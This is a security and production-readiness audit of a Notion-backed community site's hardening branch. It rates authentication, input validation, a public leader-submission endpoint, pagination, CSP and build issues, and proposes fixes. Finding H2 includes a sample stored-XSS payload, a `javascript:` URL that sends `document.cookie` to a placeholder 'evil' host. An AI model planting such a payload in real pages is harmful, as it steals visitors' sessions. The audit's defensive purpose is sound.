# Production-Readiness & Security Review — `ptc-site`

_Read-only audit of the `pf/security-hardening` branch. Findings cite `file:line`._

## 1. Executive summary

The application is **not yet production-ready, but it is close**, and the `pf/security-hardening` branch has clearly done real work: fail-fast config validation, HMAC-signed sessions with server-side expiry, constant-time comparisons, zod validation with length caps, rate limiting, `helmet`, a 100 kB body cap, and correct `httpOnly`/`secure`/`sameSite` cookie flags. There is **no `dangerouslySetInnerHTML` anywhere** and email HTML is escaped. The most important remaining gaps are: (1) a **public, unauthenticated write into the `CommunityLeaders` database** — the same table that governs portal authorization — with no ownership check or approval flag; (2) **stored-XSS via `javascript:` URLs** because user-supplied URLs (`eventUrl`) are never scheme-validated before being rendered into an `href`; and (3) **Notion queries are not paginated**, so the site silently drops events/communities past 100 rows. Top risks are therefore an authorization-data-poisoning path, a click-to-execute XSS, and a correctness cliff at scale. None rise to an unauthenticated remote-code or full-account-takeover "Critical," largely because of the existing mitigations (admin-gated magic-link issuance, approval gates, fail-fast prod boot).

## 2. Verdict table

| Dimension | Rating |
|---|---|
| Security — AuthN/AuthZ & sessions | **Needs work** (solid crypto; weak spot is public CRM write + no per-session revocation) |
| Security — Input validation & injection/XSS | **Needs work** (good length caps; missing URL-scheme validation → stored XSS) |
| Security — Rate limiting / CSRF / headers | **Good** (Lax + JSON + rate limits; no CSP is the gap) |
| Security — Secret & info leakage | **Needs work** (default creds & DB IDs committed; generic client errors are good) |
| Correctness & reliability | **Needs work** (unpaginated Notion; `Promise.all` fail-fast; no retries) |
| Production readiness | **Needs work** (broken prod build/run story; in-memory state; thin observability) |
| Code quality & maintainability | **Needs work** (zero tests, no CI, no linter, pervasive `as any`) |
| Accessibility & UX | **Needs work** (inline-styled divs-as-controls, contrast, focus) |

## 3. Findings

### Critical

None confirmed. The design decisions that would normally produce a Critical (forgeable sessions, default secrets in prod, unauth admin writes) are blocked by `validateEnv()` and the auth guards.

---

### High

**H1 — Public, unauthenticated write to the portal-authorization database (`submit-leader`)**
`server/routes/communities.ts:93-123`
The `POST /api/communities/submit-leader` endpoint is public (rate-limited only) and creates a row in `COMMUNITY_LEADERS_DB` linking an **attacker-chosen email** to **any existing `communityId`**, with no proof the submitter controls that community and no `Approved`/pending flag. That table is exactly what `getLeaderByEmail()` (`server/notion.ts:126-134`) reads to decide which `communityIds` a magic link grants.
- **Impact / scenario:** _Confirmed_ — anyone can pollute the CRM with arbitrary leader records for real communities (spam, data integrity). _Suspected escalation_ — an attacker registers `attacker@evil.com` as leader of an established community; if an admin is ever socially engineered into issuing a magic link to that address (the Portal screen just takes a typed email), the attacker gains portal write access (create/edit/delete events) for that community. `getLeaderByEmail` also blindly trusts `results[0]`, so duplicate-email records make the granted scope ordering-dependent.
- **Confidence:** Confirmed (write primitive); suspected (full privilege escalation, needs the admin step).
- **Fix:** Treat leader submissions as unapproved leads in a staging state that never feeds `getLeaderByEmail`; require an approval step before a leader row becomes authorization-bearing. At minimum, dedupe/verify email ownership and reject linking to communities the submitter didn't just create in the same flow.

**H2 — Stored XSS via `javascript:` URLs (no scheme validation on user URLs)**
`server/lib/validation.ts:6` (`urlStr = z.string().max(500)` — no `.url()`, no scheme allow-list); rendered at `src/components/EventRow.tsx:167` (`<a href={event.eventUrl || '#'}>`).
`eventUrl` is settable by portal leaders (`POST/PUT /api/events`) and admins, and is never restricted to `http(s):`. React does **not** sanitize `javascript:` in `href`, so a value like `javascript:fetch('//evil/'+document.cookie)` executes when any public visitor clicks "Register ↗".
- **Impact / scenario:** _Confirmed_ vector. A portal leader (semi-trusted, invited) sets a malicious `eventUrl`; once the event is approved it is served to all visitors, and clicking runs arbitrary script in the site origin. `communityPage`/`logoUrl` share the same missing validation (currently `communityPage` isn't rendered as a link and `logoUrl` would go in `src`, so `eventUrl` is the live sink).
- **Confidence:** Confirmed (no scheme check + raw `href`).
- **Fix:** Validate URLs with a scheme allow-list (`https?:` only) in zod (`z.string().url().refine(scheme ∈ {http,https})`), and defensively guard the `href` render. Note the approval gate does **not** currently check the scheme, so admin approval isn't a mitigation.

---

### Medium

**M1 — Notion queries are not paginated (silent data loss at 100 rows)**
`server/notion.ts:141-166` (`getCommunities`, `getEvents`) and `126-134` (`getLeaderByEmail`).
`notion.databases.query` returns at most 100 results per call and exposes `has_more`/`next_cursor`, which is never used. Once approved events or communities exceed 100, the public site silently omits the rest (ordering by Name/Date makes the omission systematic, not random).
- **Impact:** _Confirmed_ correctness/scale bug — events/communities disappear from the directory with no error. For `getLeaderByEmail` the `equals` filter makes >100 matches unlikely, so that call is lower risk.
- **Fix:** Loop on `next_cursor` until `has_more` is false (or use the SDK's `iteratePaginatedAPI`). Pair with caching (see M4).

**M2 — No Content-Security-Policy**
`server/index.ts:26` (`helmet({ contentSecurityPolicy: false })`).
CSP is disabled because of inline styles + Google Fonts. With H2 present, there's no second line of defense to blunt script execution or exfiltration.
- **Impact:** Defense-in-depth gap; raises the blast radius of any XSS.
- **Fix:** Add a CSP that permits `'unsafe-inline'` for styles and the two `fonts.g*` hosts but restricts `script-src` to `'self'`. Even a script-only CSP would have neutralized H2.

**M3 — Magic-link token travels in a URL (logging/Referer/history exposure)**
`server/lib/email.ts:24` builds `${siteUrl}/api/portal/auth/${token}`; consumed at `server/routes/portal.ts:101-114`.
Entropy (80 bits via `randomBytes(10)`) and one-time-use + 24 h expiry are fine. The residual risk is that the token rides in the request path: reverse-proxy/access logs, browser history, and any `Referer` on the post-redirect page can capture it. One-time consumption limits replay to the window before the legitimate click.
- **Impact:** _Confirmed_ exposure surface; _suspected_ practical replay only if a log/Referer leaks before first use.
- **Fix:** Consume via `POST` (token in body) or immediately invalidate + rotate on first hit (already deleted on consume — good); ensure proxy access logs scrub `/api/portal/auth/*`. Acceptable as-is if logs are controlled.

**M4 — In-memory state defeats horizontal scaling; no caching against Notion's ~3 req/s limit**
`server/lib/tokens.ts:9` (token `Map`) and `express-rate-limit` default memory store (`server/lib/ratelimit.ts`).
Both are per-process. Behind >1 instance, magic links issued on node A won't validate on node B, and rate-limit counters are per-instance (attacker gets `N × instances`). No response caching means each page hit fans out to Notion, which rate-limits at ~3 req/s and has no retry/backoff here.
- **Impact:** Breaks multi-instance deploys; risk of Notion 429s under modest traffic. The code comments already acknowledge this.
- **Fix:** Move tokens and rate-limit store to Redis before scaling out; add a short-TTL cache in front of `getEvents`/`getCommunities`.

**M5 — Broken production build/run story**
`README.md:159-164` says `node server/index` "necessita transpilação prévia," but `pnpm build` only builds the SPA (`package.json:10`), and there is no script that compiles the server. `tsconfig.server.json` emits to `dist-server/` but nothing invokes it, and the entry uses `.js` ESM specifiers that only resolve at runtime via `tsx`.
- **Impact:** _Confirmed_ — following the README does not yield a runnable production server; you must run under `tsx` or add a build step.
- **Fix:** Add `"build:server": "tsc -p tsconfig.server.json"` + a documented `node dist-server/index.js` (or standardize on `tsx` in prod and say so). Add a `start` script.

---

### Low / Nits

- **L1 — Default credentials & DB IDs committed.** `.env.example:9,12` ship `ADMIN_PASSWORD=ptcadmin` and `SESSION_SECRET=change-me-in-production`; real Notion DB IDs are hardcoded as defaults in `server/notion.ts:3-5` and `.env.example:5-6`. DB IDs aren't secret without the token, but combined with a leaked token they remove a step. Dev defaults (`server/lib/env.ts:7-8`) are only safe because `validateEnv` blocks them in prod — keep that invariant. _Fix:_ don't ship a working default password; use placeholders.
- **L2 — `notion.pages.retrieve(req.params.id)` on public GET `/:id`** (`events.ts:47`, `communities.ts:35`) lets an attacker probe arbitrary page IDs accessible to the integration token; parsers return empty objects for non-matching schemas, so low impact, but it's an unbounded id oracle. _Fix:_ validate the page belongs to the expected database.
- **L3 — `getCommunitiesByIds` uses `Promise.all`** (`notion.ts:136-139`): a single failed `retrieve` rejects the whole magic-link issuance. _Fix:_ `Promise.allSettled` and tolerate partial failures.
- **L4 — No per-session revocation.** Admin/portal tokens are valid until 8 h expiry or a `SESSION_SECRET` rotation (which nukes all sessions). A compromised portal cookie can't be individually revoked, and a leader's changed community scope stays stale up to 8 h (scope is baked into the cookie). Acceptable for this app's size; document it.
- **L5 — Config URLs (social links, `contactFormUrl`) also lack scheme validation** (`validation.ts:66-77`), rendered as `href` in `About.tsx`/`Footer.tsx`. Admin-only input, so self-inflicted; fold into the H2 URL-validation fix.
- **L6 — Observability is thin.** Only `/health` and `console.error`. No structured logging, request logging, error monitoring (e.g. Sentry), or graceful shutdown. Add before launch.
- **L7 — Config file write is not concurrency-safe** (`config.ts:56-61`): last-writer-wins on `data/site-config.json`. Admin-only and low frequency, so minor.
- **L8 — SPA router is fragile** (`src/App.tsx`): hash-based with a conditional `useState` after an early `return` for `#portal` (React hooks-order smell, currently safe only because the early return precedes all hooks), no `hashchange`/`popstate` listener (back/forward won't re-render non-portal pages), and no 404 state. The prod SPA fallback (`index.ts:43-46`) covers deep-link refresh only when the Node process serves static files.

## 4. Tooling results

- **Client typecheck** (`pnpm typecheck` / `tsc -p tsconfig.json`): **clean, no errors.**
- **Server typecheck** (`tsc -p tsconfig.server.json --noEmit`): **clean, no errors.**
- **Build** (`pnpm build`): **succeeds** — 51 modules, `dist/assets/index-*.js` 279.83 kB (81.29 kB gzip). Frontend only; no server artifact produced (see M5).
- **`pnpm audit`**: **5 vulnerabilities (2 high, 1 moderate, 2 low).** All are **dev/transitive**:
  - `esbuild` (2 low) and `vite` `server.fs.deny` bypass + `launch-editor` NTLM (high/moderate) — **dev-server only**, not shipped in `dist`. Fixed by bumping Vite to ≥7.3.5.
  - `form-data <4.0.6` CRLF (high) reaches via `@notionhq/client → @types/node-fetch → form-data`. Notion requests don't build multipart bodies from user-controlled field names, so **not exploitable here**, but bump when convenient.
- **Lint/format:** no ESLint/Prettier/Biome configured (`package.json`). **No CI** (`.github/` absent). **No tests.**

## 5. Prioritized action list (before going live)

1. **Fix H1** — make `submit-leader` non-authorization-bearing (staging + approval) so an unauthenticated caller can't seed portal access data.
2. **Fix H2** — enforce an `http(s)`-only scheme on all user-supplied URLs (`eventUrl`, `communityPage`, `logoUrl`) in zod, and guard the `href` render.
3. **Add pagination (M1)** to `getEvents`/`getCommunities` so the directory doesn't silently truncate at 100 rows.
4. **Fix the prod build/run story (M5)** — add a server build/start path and correct the README; verify a clean `NODE_ENV=production` boot end-to-end.
5. **Add a CSP (M2)** as XSS defense-in-depth (script-src 'self'), even with inline styles allowed.
6. **Bump Vite ≥7.3.5 and `form-data` ≥4.0.6** to clear the audit; add `pnpm audit` (and typecheck/build) to a minimal CI.
7. **Before any multi-instance deploy (M4):** move tokens + rate-limit store to Redis and add short-TTL caching + retry/backoff around Notion.
8. **Harden operations (M3, L1, L6):** scrub magic-link tokens from proxy logs, replace the committed default admin password with a placeholder, and wire up structured logging + error monitoring + graceful shutdown.
9. **Add tests** — prioritize the authorization boundaries: `submit-leader`, portal event ownership checks (`events.ts` PUT/DELETE `owns`), admin-vs-portal scoping on `GET /events?all=true`, and session verify/expiry. These are the security-critical, currently-untested paths.

---

**What's genuinely well done** (don't touch): the HMAC session design with server-side expiry and `timingSafeEqual`, the fail-fast `validateEnv()`, the zod length caps that bound Notion writes, `serverError()` not leaking internals, escaped email HTML, and correct cookie flags. The security branch has moved this from "prototype" to "nearly shippable."
